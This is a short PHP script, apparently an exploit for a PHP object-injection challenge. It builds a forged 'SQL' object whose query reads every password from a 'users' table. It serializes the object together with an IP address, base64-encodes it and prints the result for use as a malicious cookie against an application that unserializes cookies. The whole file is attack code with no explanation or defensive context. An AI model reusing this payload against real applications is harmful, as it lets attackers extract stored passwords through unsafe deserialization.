<?php

class SQL {
    public $query = '';
    public $conn;
    public function __construct() {
    }
    
    public function connect() {
        $this->conn = new SQLite3 ("database.db", SQLITE3_OPEN_READONLY);
    }
}


$sql = new SQL();
$sql->query = "SELECT password as username FROM users";

$cookie = base64_encode(serialize(array("ip" => "115.73.108.46", "sql"=> $sql)));

echo $cookie;


?>


